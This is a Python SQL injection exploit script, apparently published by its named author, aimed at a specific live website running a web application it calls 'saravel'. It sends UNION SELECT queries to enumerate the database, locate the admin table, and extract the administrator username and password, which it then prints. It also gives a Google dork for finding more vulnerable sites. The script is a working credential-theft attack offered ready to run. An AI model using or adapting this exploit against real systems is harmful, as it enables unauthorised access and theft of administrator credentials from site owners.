# -*- coding: utf-8 -*-

"""
Created on July 2022

@author: Hosein Khanali
"""

import sys
import requests
from bs4 import BeautifulSoup


BLUE = '\033[94m'
GREEN = '\033[92m'
RED = '\033[91m'
YELLOW = "\033[93m"
LINK = "\033[34m"
RESET = "\033[0;0m"

def admins_table_name(url:str):
    query = ' union select 1,group_concat(table_name),3,4,5,6,7,8,9,10,11,12,13,14 from information_schema.tables where table_schema=database()'
    r = requests.get(url + query)
    html = BeautifulSoup(r.content, 'html.parser')
    admin = html.findAll('img')
    admin = admin[4]['alt'].split(',')[0]
    return admin

def admins_column_name(url:str,admin:str):
    query = " union select 1,group_concat(column_name),3,4,5,6,7,8,9,10,11,12,13,14 from information_schema.columns where table_name='" + admin + "'"
    r = requests.get(url + query)
    html = BeautifulSoup(r.content, 'html.parser')
    data = html.findAll('img')
    username_column = data[4]['alt'].split(',')[1]
    password_column = data[4]['alt'].split(',')[2].split('"')[0]
    return username_column,password_column

def username_data(url:str,username_column:str):
    query = ' union select 1,' + username_column + ',3,4,5,6,7,8,9,10,11,12,13,14 from admin'
    r = requests.get(url + query)
    html = BeautifulSoup(r.content, 'html.parser')
    c = html.findAll('img')
    username = c[4]['alt'].split('"')[0]
    return username

def password_data(url:str,password_column:str):
    query = ' union select 1,' + password_column + ',3,4,5,6,7,8,9,10,11,12,13,14 from admin'
    r = requests.get(url + query)
    html = BeautifulSoup(r.content, 'html.parser')
    c = html.findAll('img')
    password = c[4]['alt'].split('"')[0]
    return password

def banner():
    print(BLUE + """
         _____     ____      _____        _____  
        / ____\   / __ \    (_   _)      (_   _) 
       ( (___    / /  \ \     | |          | |   
        \___ \  ( (    ) )    | |          | |   
            ) ) ( (  /\) )    | |   __     | |   
        ___/ /   \ \_\ \/   __| |___) )   _| |__ 
       /____/     \___\ \_  \________/   /_____( 
                        \__)                      """)
    print("" + RED,
"#####################################################\n",
"## " + BLUE + "SQL Injection Vulnerability on Traget           " + RED + "##\n",
"##                                                 ##\n",
"## " + GREEN + "Author :" + LINK + " Hosein Khanali                         " + RED + "##\n",
"## " + GREEN + "Gmail  :" + LINK + " hosein.asf147@gmail.com                " + RED + "##\n",
"## " + GREEN + "Github :" + LINK + " https://github.com/hosein-khanalizadeh " + RED + "##\n",
"#####################################################\n" + RESET)

def main():
    banner()
    url = 'https://saar.ir/book.php?id=-47'
    admin = admins_table_name(url)
    username_column, password_column = admins_column_name(url, admin)
    username = username_data(url, username_column)
    password = password_data(url, password_column)
    print(YELLOW + ' Exploit Title     : ' + GREEN + 'saravel sql injection vulnerability',
          YELLOW + '\n Date              : ' + GREEN + '14-7-2022',
          YELLOW + '\n Exploit Author    : ' + GREEN + 'hosein khanali',
          YELLOW + '\n Vendor Homepage   : ' + LINK + 'www.saravel.ir',
          YELLOW + '\n google dork       : ' + GREEN + 'site:.ir inurl:news.php?id=',
          YELLOW + '\n Category          : ' + GREEN + 'webapps',
          YELLOW + '\n Tested on         : ' + GREEN + 'windows 7, firefox',
          YELLOW + '\n CVE               : ' + GREEN + 'N/A' + RESET,
          '\n' + 50*'-',
          YELLOW + '\n target            : ' + LINK + url,
          YELLOW + '\n admins table name : ' + BLUE + admin,
          YELLOW + '\n username column   : ' + BLUE + username_column,
          YELLOW + '\n password_column   : ' + BLUE + password_column,
          YELLOW + '\n username          : ' + BLUE + username,
          YELLOW + '\n password          : ' + BLUE + password + RESET,
          '\n' + 50*'-',
          GREEN + '\n Find Admin Page by https://github.com/hosein-khanalizadeh/AdminPageFinder' + RESET)

if __name__ == '__main__':
    try:
        main()
    except KeyboardInterrupt:
        sys.exit()